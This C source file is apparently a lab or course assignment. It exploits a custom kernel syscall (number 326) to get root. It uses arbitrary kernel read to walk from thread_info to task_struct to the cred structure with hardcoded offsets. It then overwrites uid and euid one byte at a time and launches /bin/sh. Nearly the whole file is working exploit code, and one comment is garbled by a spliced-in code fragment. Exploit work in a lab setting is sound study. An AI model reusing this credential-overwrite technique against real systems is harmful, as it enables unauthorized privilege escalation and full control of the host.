#include <stdio.h>
#include <unistd.h>
void runExploit() {
    long thread_info, addr1, addr2, task, cred;
    unsigned long uid_address, euid_address;

    for(int i = 0; i < 4; i++) {        //increment 4 arbitrary writes for uid since they are each 4 bytes in size.
        // First, locate thread info using provided system call. Check kernel source code.
        syscall(326,0,NULL); //reset node array with 1 head node

        // Next, you need to find thread_info->task->cred
        //
        // 1.  Use GDB to calculate the offset in the structure and find what is the relationship between thread_info and thread_info->task, struct task and task->cred, struct cred and cred->uid/cred->euid.
        //     For example:
        //     (gdb) print (int)&((struct thread_info*)0)->task
        //     will gives you the offset between struct thread_info and  thread_info->task
        //     
        //              thread_info -> task = 0
        //              task_struct -> cred = 1456
        //              cred -> uid = 4
        //              cred -> euid = 20;
        //
        // 2. Then you can make use of arbitrary read to get the address of struct task.
        thread_info = syscall(326, 4, NULL);

        //Get first 4 bytes (addr1)
        syscall(326, 2, (void*) thread_info - 4); //shift 4 bytes to the left
        addr1 = syscall(326, 3, NULL);

        //Get next 4 bytes (addr2)
        syscall(326, 2, (void*) thread_info);
        addr2 = syscall(326, 3, NULL);

        //combine the two addresses to get task_struct address
        task = (addr2 << 32) + addr1;  //Little-end

        // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.
        //Get addr1 and addr2 again but now from task_struct
        syscall(326, 2, (void*) task - 4 + 1456);
        addr1 = syscall(326, 3, NULL);

        syscall(326, 2, (void*) task + 1456);
        addr2 = syscall(326, 3, NULL);

        //combine the two addresses to get struct cred address
        cred = (addr2 << 32) + addr1;

        for(int j = 0; j < 255; j++){   //Add 255 nodes to idx,by incrementing 255 times;
                syscall(326, 1, j);     //to overwrite "next" to zero as it only contains 1 byte (8 bits).      
        }

        uid_address = cred + 4;         //address of uid.
        syscall(326, 2, uid_address - 8 + i);   //set arbitrary address of uid.

        //Finally, you will need to rewrite thethread_info = syscall(326, 4, NULL);
        syscall(326, 1, -1);   //Since node->next is 8 bytes behind ID we subtract 8; current arbitrary write using i;
                                        //add node to address uid; write complete!
    }

    for(int i = 0; i < 4; i++) {        //increment 4 arbitrary writes for euid since they are each 4 bytes in size.
        // First, locate thread info using provided system call. Check kernel source code.
        syscall(326,0,NULL); //reset node array with 1 head node

        // 2. Then you can make use of arbitrary read to get the address of struct task.
        //Get first 4 bytes (addr1)
        syscall(326, 2, (void*) thread_info - 4); //shift 4 bytes to the left
        addr1 = syscall(326, 3, NULL);

        //Get next 4 bytes (addr2)
        syscall(326, 2, (void*) thread_info);
        addr2 = syscall(326, 3, NULL);

        //combine the two addresses to get task_struct address
        task = (addr2 << 32) + addr1;  //Little-end

        // 3. Similarly, you can get the address of struct cred, uid/euid finally with the help of arbitrary read.
        //Get addr1 and addr2 again but now from task_struct
        syscall(326, 2, (void*) task - 4 + 1456);
        addr1 = syscall(326, 3, NULL);

        syscall(326, 2, (void*) task + 1456);
        addr2 = syscall(326, 3, NULL);

        //combine the two addresses to get struct cred address
        cred = (addr2 << 32) + addr1;

        for(int j = 0; j < 255; j++){
                syscall(326, 1, j);
        }

        euid_address = cred + 20;       //address of euid.
        syscall(326, 2, euid_address - 8 + i);        //set arbitrary address of euid.

        // Finally, you will need to rewrite the uid/euid in cred struct and give your process highest privilege
        syscall(326, 1, -1);   //Since node->next is 8 bytes behind ID we subtract 8; current arbitrary write using i;
                                        //add node to address euid; write complete!
    }
    return;
}

int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"euid = %d\n",geteuid());
    // The exploit itself
    runExploit();

    // If the exploit is successful, getuid() should return zero.
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid = %d\n",geteuid());

    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}
